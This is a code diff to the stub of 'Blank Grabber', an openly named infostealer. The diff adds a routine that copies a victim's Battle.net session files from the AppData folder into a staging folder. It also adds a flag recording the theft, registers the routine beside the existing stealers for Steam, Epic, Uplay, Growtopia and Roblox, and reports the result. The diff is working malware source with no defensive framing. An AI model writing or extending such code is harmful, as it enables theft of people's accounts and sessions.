+++ Blank Grabber/Components/stub.py
@@ -904,6 +904,7 @@ class BlankGrabber:
     SteamStolen: bool = False # Indicates whether Steam account was stolen or not
     EpicStolen: bool = False # Indicates whether Epic Games account was stolen or not
     UplayStolen: bool = False # Indicates whether Uplay account was stolen or not
+    BattleNetStolen: bool = False # Indicates whether Battle.Net account was stolen or not
     GrowtopiaStolen: bool = False # Indicates whether Growtopia account was stolen or not
 
     def __init__(self) -> None: # Constructor to call all the functions
@@ -931,6 +932,7 @@ class BlankGrabber:
             (self.StealGrowtopia, False),
             (self.StealSteam, False),
             (self.StealUplay, False),
+            (self.StealBattleNet, False),
             (self.GetAntivirus, False),
             (self.GetClipboard, False),
             (self.GetTaskList, False),
@@ -1113,7 +1115,19 @@ class BlankGrabber:
                         os.makedirs(saveToPath, exist_ok= True)
                         shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
                         self.UplayStolen = True
-    
+
+    @Errors.Catch
+    def StealBattleNet(self) -> None: #Steal Battle.Net accounts
+        if Settings.CaptureGames:
+            Logger.info("Stealing Battle.Net session")
+            saveToPath = os.path.join(self.TempFolder, "Games", "Battle.Net")
+            battlePath = os.path.join(os.getenv("appdata"), "Battle.net")
+            if os.path.isdir(battlePath):
+                for item in os.listdir(battlePath):
+                    if os.path.isfile(os.path.join(battlePath, item)):
+                        os.makedirs(saveToPath, exist_ok= True)
+                        shutil.copy(os.path.join(battlePath, item), os.path.join(saveToPath, item))
+                        self.BattleNetStolen = True
     @Errors.Catch
     def StealRobloxCookies(self) -> None: # Steals Roblox cookies
         if Settings.CaptureGames:
@@ -1619,6 +1633,7 @@ class BlankGrabber:
             "Epic Session" : "Yes" if self.EpicStolen else "No",
             "Steam Session" : "Yes" if self.SteamStolen else "No",
             "Uplay Session" : "Yes" if self.UplayStolen else "No",
+            "Battle.Net Session" : "Yes" if self.BattleNetStolen else "No",
             "Growtopia Session" : "Yes" if self.GrowtopiaStolen else "No",
             "Screenshot" : "Yes" if self.ScreenshotTaken else "No",
             "System Info" : "Yes" if self.SystemInfoStolen else "No"